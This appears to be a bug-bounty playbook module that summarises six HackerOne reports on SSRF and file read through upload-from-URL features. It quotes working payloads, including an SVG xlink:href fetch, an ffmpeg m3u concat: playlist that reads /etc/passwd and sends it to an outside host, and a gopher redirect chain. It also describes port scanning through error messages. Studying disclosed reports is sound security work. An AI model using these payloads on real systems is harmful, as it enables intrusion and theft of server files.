---
title: "Upload-URL fetch → SSRF & file read (the all-paid module)"
type: playbook
category: upload-url-ssrf
cwe: "CWE-918 · CWE-73"
source_count: 6
full_bodies_available: 6
corpus: "h1.security.nathan.sx roster (86 title-arm rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-11-05"
note: "Anchor bodies: FU-115857 (Imgur vidgif SSRF+file:// read, $800 list), FU-713 (H1's own row 713 — $500 list), FU-158016 ($50 json), FU-228377 ($64 json). Claims trace to bodies read 2026-11-05."
---

# Module 02 — upload via URL: the server goes where you point it

## 1. Overview

Six rows, **$2,064/6 paid — the only module in the vault where every single row carries a
bounty**. The pattern: an upload form that accepts a *remote URL* is a server-side fetch
primitive; whatever the backend does with the fetched bytes decides whether you get SSRF
(ping the internals), information leak (error pages quote the upstream), or full file read
(ffmpeg `concat:`). The corpus prices the whole family consistently small — $500 ceiling —
because none of these rows demonstrated a crown-jewel network position, only reachable
internals and readable files. The lane's price floor ($50–$64) is where Instacart's
list-image fields sit.

**Case-stock (6 rows / $2,064):**

| Case | Target | Mechanism | Bounty |
|---|---|---|---|
| [FU-713](https://hackerone.com/reports/713) | HackerOne | profile photo from user URL — the corpus opener | $500 (list) |
| [FU-97501](https://hackerone.com/reports/97501) | Shopify | SVG `xlink:href` — server-side parser fetches | $500 (list) |
| [FU-115857](https://hackerone.com/reports/115857) | Imgur | vidgif playlist → Lavf SSRF + `concat:`/`subfile` file read | $800 (list) |
| [FU-159820](https://hackerone.com/reports/159820) | Instacart | list-image PUT bundle: ports + SSH banner + rmagick | $150 (list) |
| [FU-158016](https://hackerone.com/reports/158016) | Instacart | `list[remote_image_url]` SSRF — port 21 banner | $50 (json) |
| [FU-228377](https://hackerone.com/reports/228377) | Discourse | IMG redirect chain → gopher + ftp fetch | $64 (json) |

Dead-row cross note: **FU-111269** (Pornhub, "[ssrf] libav vulnerable during conversion of
uploaded videos", $1,500 404-list) is the same `Lavf`-family bug on a sibling target; the
live kin below is FU-115857.

## 2. Anatomy

### 2.1 The URL-in-upload primitive

**FU-713** — HackerOne's own program, one of the corpus's earliest rows — states the
primitive plainly:

> Using this vulnerability users can upload images from any image URL.
> Just change upload type using inspect element  (from "type=file" to "type=url") , paste
> URL in text field and hit enter or click on "Update Profile". Your profile photo will be
> changed to photo from URL.

Client-side toggle flip makes the *server* the HTTP client — every later row in this
module is that bug wearing defenses. **FU-158016** prices it at the floor ($50 (json)) —
the fetch table errors quote the upstream: `Image could not download file: wrong status
line: "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3"`. **FU-159820** extends the same field
into a port-scan chassis (`localhost:80` 404 vs `localhost:1010` refused vs port 22
banner) — $150 (list).

### 2.2 Markup-and-media parsers as fetch engines

**FU-97501** ($500 (list)) — the SVG route:

```
<image xlink:href="http://example.com/?evil=var" />
```

with the netcat proof from the body:

```
Listening on [0.0.0.0] (family 0, port 3001)
Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
GET /?evil=var HTTP/1.0
Host: 37.139.18.151:3001
Accept-Encoding: gzip
```

Server-side image tooling obeys the SVG spec's external references — a class of parser
bugs the XXE vault handles for XML; here it is image markup doing the fetching.

### 2.3 The playlist that reads files

**FU-115857** is the module's technical crown — `.m3u` uploads to Imgur's vidgif converter
(powered by `Lavf/55.48.100`, ffmpeg) with `-network enabled`:

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

The body's receipt line, byte-true:

> 54.82.61.224 - - [11/Feb/2016:04:55:32 -0500] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 400 173 "-" "-" "-"

—the `concat:` protocol welds a fetched URL to `file:///etc/passwd`, and the read lands in
the *outbound request line*. The report's closing ladder, byte-true (URL included, as the
body writes it):

> it is possible to read full files by subfile proto
> https://www.ffmpeg.org/ffmpeg-protocols.html#subfile or by constructing 100% valid video
> files and extracting data from gifs.
> Sensitive files on server, some private apis, accessable from server, or some other
> allowed protocols which I didn't check may lead even to RCE.

$800 (list) — small money, complete chain.

**FU-228377** ($64 (json)) is the redirect-evasion variant: a markup image URL whose server
responds 302 to `Location: gopher://192.166.218.53:80/test123`, then ftp — the fetcher
follows arbitrary schemes from a markup field, proven twice via logs (HTTP `Ruby` UA and
vsftp.log).

## 3. Techniques (corpus-derived)

1. **Flip `type=file` → `type=url`** and watch what the server does — 713's opener stands
   today wherever upload-from-URL survives.
2. **Error-message harvesting**: internal network state leaks through the failure text —
   banners, ports, rmagick temp paths (159820, 158016; sibling 158021 in module 05).
3. **Format-as-fetch**: SVG `xlink:` (97501), XLIFF external entities (module 04),
   playlist `concat:` (115857) — every media parser with network primitives is an SSRF
   engine once it accepts uploads.
4. **Scheme-hopping via 302**: when the fetcher pins schemes, its redirect-following may
   not (228377).

## 4. Kill-gates

- Every row here needs a *server≠you* proof: netcat with a public IP (97501), upstream log
  line (115857, 228377), or upstream-leaking error text (158016, 159820).
- Pricing honesty: demonstration limit = price ceiling. $50–$800 range holds because no
  row proved admin-panel or controlled-cloud reach; say so in the report the way 115857
  says it.
